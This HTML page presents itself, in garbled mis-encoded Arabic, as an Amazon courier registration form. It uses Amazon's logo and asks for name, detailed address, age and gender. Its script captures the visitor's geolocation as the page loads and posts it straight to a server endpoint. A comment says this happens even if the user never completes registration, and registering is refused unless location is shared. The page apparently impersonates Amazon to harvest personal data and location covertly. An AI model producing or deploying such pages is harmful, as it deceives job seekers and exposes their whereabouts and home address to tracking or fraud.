<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ØªØ³Ø¬ÙŠÙ„ Ù…Ù†Ø¯ÙˆØ¨ Ø£Ù…Ø§Ø²ÙˆÙ†</title>
  <link rel="stylesheet" href="./css/style.css">
</head>
<body>
    <div class="image">
        <img src="https://jobs.amazon.eg/app/logo_dark.99265b07.svg" alt="">
    </div>

  <h1>ØªØ³Ø¬ÙŠÙ„ ÙƒÙ…Ù†Ø¯ÙˆØ¨ Ø£Ù…Ø§Ø²ÙˆÙ†</h1>
<p style="text-align:center; font-size:18px; color:#333; margin-bottom:20px; margin: 13px;">
Ø§Ù†Ø¶Ù… Ù„ÙØ±ÙŠÙ‚Ù†Ø§ Ø§Ù„Ø¢Ù† ÙˆØ§Ø¨Ø¯Ø£ Ù…Ø³ÙŠØ±ØªÙƒ ÙƒÙ…Ù†Ø¯ÙˆØ¨ Ø£Ù…Ø§Ø²ÙˆÙ† Ù…Ø¹ ÙØ±ØµØ© Ù„ÙƒØ³Ø¨ Ø¯Ø®Ù„ Ø«Ø§Ø¨Øª ÙˆØªØ­Ù‚ÙŠÙ‚ Ø§Ù„Ù†Ø¬Ø§Ø­!
</p>
  <form id="deliveryForm">
    <input type="text" name="name" placeholder="Ø§Ù„Ø§Ø³Ù…" required /><br/>
    <input type="text" name="address" placeholder=" Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø¨Ø§Ù„ØªÙØµÙŠÙ„" required /><br/>
    <input type="number" name="age" placeholder="Ø§Ù„Ø³Ù†" required /><br/>
    <select name="gender" required>
      <option value="">Ø§Ø®ØªØ± Ø§Ù„Ø¬Ù†Ø³</option>
      <option value="Male">Ø°ÙƒØ±</option>
      <option value="Female">Ø£Ù†Ø«Ù‰</option>
    </select><br/>
    <button type="submit">ØªØ³Ø¬ÙŠÙ„</button>
  </form>

<script>
  let userLocation = null;

  // Ø¯Ø§Ù„Ø© ØªØ¨Ø¹Øª Ø§Ù„Ù„ÙˆÙƒÙŠØ´Ù† Ù„ÙˆØ­Ø¯Ù‡
  function sendLocation(lat, lon) {
    fetch('/api/delivery', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ location: `${lat},${lon}` })
    })
      .then(res => res.json())
      .then(data => console.log("ğŸ“ Location sent immediately:", data))
      .catch(err => console.error("Error sending location:", err));
  }

  // Ù†Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø£ÙˆÙ„ Ù…Ø§ ÙŠÙØªØ­ Ø§Ù„ØµÙØ­Ø©
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        userLocation = `${lat},${lon}`;
        console.log("Location captured:", userLocation);

        // â¬…ï¸ Ù†Ø¨Ø¹ØªÙ‡ ÙÙˆØ±Ø§Ù‹ Ø­ØªÙ‰ Ù„Ùˆ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø§ÙƒÙ…Ù„Ø´ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        sendLocation(lat, lon);
      },
      (error) => {
        alert('âš ï¸ ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„.');
      }
    );
  } else {
    alert('âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹.');
  }

  // Ø§Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙÙˆØ±Ù… + Ø§Ù„Ù…ÙˆÙ‚Ø¹
  const form = document.getElementById('deliveryForm');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    if (!userLocation) {
      alert("âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¯ÙˆÙ† ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹");
      return;
    }

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());
    data.location = userLocation;

    const res = await fetch('/api/delivery', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    alert(result.message || result.error);
  });
</script>


</body>
</html>
